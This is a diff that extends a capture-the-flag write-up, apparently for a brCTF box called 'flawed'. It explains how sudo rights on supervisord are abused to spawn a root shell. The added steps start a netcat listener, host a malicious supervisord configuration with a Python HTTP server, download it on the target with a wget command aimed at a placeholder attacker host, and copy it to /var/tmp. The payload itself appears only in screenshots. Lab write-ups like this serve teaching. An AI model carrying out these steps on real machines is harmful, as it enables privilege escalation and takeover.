@@ -66,5 +66,20 @@ After doing some research we find out that: <br>
 Supervisord is a `process control system` for Unix-like operating systems. It allows you to manage and monitor multiple processes, ensuring that they run continuously and `automatically restarting` them if they fail. Supervisord is often used to manage services, daemons, and other long-running processes.
 
 Supervisord can run commands in it's configuration file. Now you get the hint from here? So what we'll have to do is to craft a configuration file for supervisord which contains commands to execute.<br>
-We will take advantage of this to spawn a shell.
+We will take advantage of this to spawn a shell.<br>
 ![sudo privs](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/spawn-nc-shell-priv.png "a title")
+
+Before anything else let's start our listener<br>
+![other nc listener](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/other-nc-listener.png "a title")
+
+Now we have to transfer our malicious configuration to the target. To make that possible we must start our local python http server in the directory containing out malicious configuration. <br>
+`python3 -m http.server 8000`
+![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/start-python-http-server.png "a title")
+
+Downloading the malicious configuation from our python http server.<br>
+NB: make sure you have write privileges to the current diretory you are in. You can use the `/tmp` since it has very loose permissions.<br>
+`wget http://<server.ip>:<port>/test.conf`
+![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/downloading-mal-conf-file.png "a title")
+
+Right after downloding the file we transfer it the the `/var/tmp` direcrory. This is necessary because it is the only folder that we can execute configuration files from.<br>
+![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/copy-payload-to-tmp.png "a title")
